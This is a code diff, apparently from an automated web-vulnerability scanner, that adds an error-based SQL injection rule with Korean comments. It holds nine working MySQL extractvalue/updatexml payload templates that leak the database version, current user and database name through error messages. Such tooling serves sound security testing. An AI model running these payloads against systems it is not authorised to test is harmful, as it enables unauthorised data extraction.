@@ -106,6 +106,30 @@ SQLI_RULES: list[dict] = [
         },
     },
     {
+        # 진짜 Error-based — extractvalue/updatexml로 값을 XPATH 에러에 실어 노출(컬럼 수 무관).
+        # 값을 마커(0x7e7e = "~~")로 감싸 서진 judge가 응답 본문에서 ~~값~~ 로 추출 → 정보추출 판정.
+        # substring(...,1,24): MySQL extractvalue 출력 32자 truncate 대응(마커 포함 ≤28자로 양쪽 마커 보존).
+        "attack_id": "PL-SQLI-ERROR-EXTRACT",
+        "vuln_type": "sqli",
+        "technique": "error_extract",
+        "judgment": "extraction",       # 서진 라우터가 extraction 경로로 분기(마커 확인)
+        "extract_marker": "~~",         # 값 양쪽 구분자 — judge의 EXTRACT_MARKER와 짝
+        "sequence": ["baseline", "attack"],
+        "payload_templates": {
+            "attack": [
+                "{value} AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
+                "{value}' AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ",
+                '{value}" AND extractvalue(1, concat(0x7e7e, substring(version(),1,24), 0x7e7e)) -- ',
+                "{value} AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
+                "{value}' AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ",
+                '{value}" AND updatexml(1, concat(0x7e7e, substring(current_user(),1,24), 0x7e7e), 1) -- ',
+                "{value} AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
+                "{value}' AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ",
+                '{value}" AND extractvalue(1, concat(0x7e7e, substring(database(),1,24), 0x7e7e)) -- ',
+            ],
+        },
+    },
+    {
         "attack_id": "PL-SQLI-TIME-MYSQL",
         "vuln_type": "sqli",
         "technique": "time_mysql",
